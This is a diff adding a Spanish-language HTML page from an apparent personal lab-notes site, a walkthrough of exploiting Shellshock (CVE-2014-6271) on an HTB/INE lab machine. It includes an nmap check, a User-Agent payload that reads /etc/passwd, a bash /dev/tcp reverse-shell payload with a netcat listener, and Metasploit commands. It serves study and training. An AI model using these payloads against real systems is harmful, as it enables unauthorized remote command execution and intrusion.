@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>INE - Shellshock (CVE-2014-6271)</title>
+    <meta name="description" content="Guía sobre la explotación de la vulnerabilidad Shellshock (Bash, CVE-2014-6271) en un entorno de laboratorio, utilizando métodos manuales (Burpsuite) y automáticos (Metasploit).">
+    <meta name="author" content="José Prados">
+    
+    <link rel="stylesheet" href="style.css"> 
+</head>
+<body>
+
+    <div class="fixed-header-container">
+        <header class="main-header">
+            <h1 class="site-title">Máquinas HTB / INE</h1>
+        </header>
+
+        <nav class="main-nav">
+            <ul>
+                <li><a href="index.html">Inicio</a></li>
+                <li><a href="conocimientos.html">Mis Conocimientos</a></li>
+                <li><a href="maquinas.html" aria-current="page">Máquinas HTB / INE</a></li>
+                <li><a href="contacto.html">Contacto</a></li>
+            </ul>
+        </nav>
+
+        <hr class="divider">
+    </div>
+
+    <div class="content-wrapper">
+        <main class="maquina-guia">
+            
+            <h2 class="titulo-maquina">Bash Vulnerability - Shellshock (CVE-2014-6271)</h2>
+            <p class="texto-maquina">
+                <str>Resumen:</str> Shellshock, o CVE-2014-6271, es una vulnerabilidad crítica y exclusiva de los sistemas Linux, ya que explota un error en la forma en que el intérprete de comandos <str>Bash</str> procesa las definiciones de funciones en las variables de entorno, lo que permite la inyección y ejecución de comandos remotos.
+            </p>
+
+            <details>
+                <summary style="color: var(--color-oro); cursor: pointer;">⚠️ Aviso educativo</summary>
+                <p style="margin-top: 10px;">
+                    Esta guía tiene fines exclusivamente educativos y está pensada para entornos controlados
+                    como laboratorios o máquinas virtuales. No debe usarse en sistemas o redes sin autorización expresa.
+                </p>
+            </details>
+
+            <p class="texto-maquina">
+                
+                <h3>Fase 1: Reconocimiento y Verificación de la Vulnerabilidad</h3>
+                
+                <p>Si un escaneo de Nmap revela el puerto 80 abierto, debemos buscar si la web utiliza un <str>CGI script</str>. Si lo hay, copiamos la ruta directa a ese script (ejemplo: <code>IP/gettime.cgi</code>).</p>
+                
+                <p>Verificación a través de Nmap (Recomendado):</p>
+                <pre><code>nmap -sV [IP_OBJETIVO] --script=shellshock --script-args "http-shellshock.uri=/gettime.cgi"</code></pre>
+                <p>Este comando nos indicará si el servidor es vulnerable o no a este tipo de <strong>exploit</strong>. En caso afirmativo, seguimos.</p>
+
+
+                <h3>Fase 2: Explotación Manual con Burp Suite</h3>
+                
+                <p>Para la explotación manual, necesitamos interceptar y modificar el tráfico. Activamos <str>FoxyProxy</str> en el navegador para redirigir todo el tráfico a <str>Burp Suite</str>.</p>
+                
+                <h4>1. Inyección de Código (Prueba de Concepto)</h4>
+                <ul>
+                    <li>En Burp Suite, vamos a la opción "Proxy", comprobamos que "Intercept" está activado y hacemos clic en Forward.</li>
+                    <li>Recargamos la web víctima y volvemos a Burp Suite, donde veremos la petición HTTP.</li>
+                    <li>Modificamos el encabezado <str>User-Agent</str> por el código que nos interesa inyectar para ejecutar un comando de prueba (ej. leer <code>/etc/passwd</code>):</li>
+                </ul>
+                <pre><code>() { :; }; echo; echo; /bin/bash -c "cat /etc/passwd"</code></pre>
+                <p>Al hacer clic en <str>SEND</str>, si el servidor es vulnerable, veremos el contenido del archivo <code>passwd</code> en la ventana de <str>Response</str>. ¡Genial, podemos ejecutar comandos de forma remota!</p>
+
+                <h4>2. Obtener Reverse Shell con Netcat</h4>
+                
+                <p>Aprovechando la vulnerabilidad, intentaremos conseguir una <strong>reverse shell</strong> a través de Netcat:</p>
+                <ol>
+                    <li>En una terminal aparte, abrimos Netcat a la escucha en el puerto elegido (ej. 1234):
+                        <pre><code>nc -nvlp 1234</code></pre>
+                    </li>
+                    <li>Volvemos a Burp Suite (en la pestaña Repeater) y modificamos el código en el <str>User-Agent</str> para solicitar que el servidor se conecte a nuestra IP:</li>
+                        <pre><code>() { :; }; echo; echo; /bin/bash -c "bash -i>&/dev/tcp/[Nuestra_IP]/1234 0>&1"</code></pre>
+                    <li>Enviamos todo y, ¡boom!, la <strong>reverse shell</strong> se conectará a la terminal donde Netcat estaba escuchando.</li>
+                </ol>
+                
+                <h3>Fase 3: Explotación con Metasploit (Opción Agilizada)</h3>
+                
+                <p>El proceso se agiliza bastante utilizando Metasploit:</p>
+                <ol>
+                    <li>Abrimos el servicio PostgreSQL y la consola de Metasploit:
+                        <pre><code>service postgresql start && msfconsole</code></pre>
+                    </li>
+                    <li>Buscamos el módulo de Shellshock. Veremos dos módulos clave: el auxiliar para la verificación y el *exploit* para conseguir la shell.
+                        <pre><code>search shellshock</code></pre>
+                    </li>
+                    <li>Elegimos el exploit que se corresponde con la explotación de CGI:
+                        <pre><code>use exploit/multi/http/apache_mod_cgi_bash_env_exec</code></pre>
+                    </li>
+                    <li>Configuramos las opciones necesarias:
+                        <pre><code>set RHOSTS [IP_OBJETIVO]
+set TARGETURI /gettime.cgi
+exploit</code></pre>
+                    <p>Si el proceso manual se estaba ejecutando (Burpsuite y FoxyProxy), deben ser deshabilitados para evitar conflictos de puertos.</p>
+                    </li>
+                </ol>
+                <p>Una vez ejecutado, conseguimos la sesión <str>Meterpreter</str>. <strong>¡Alright!</strong> 😎</p>
+
+            </p>
+
+            <p><a href="maquinas.html" style="color: var(--color-oro); text-decoration: none;">← Volver al Índice de Máquinas</a></p>
+        </main>
+    </div>
+
+</body>
+</html>
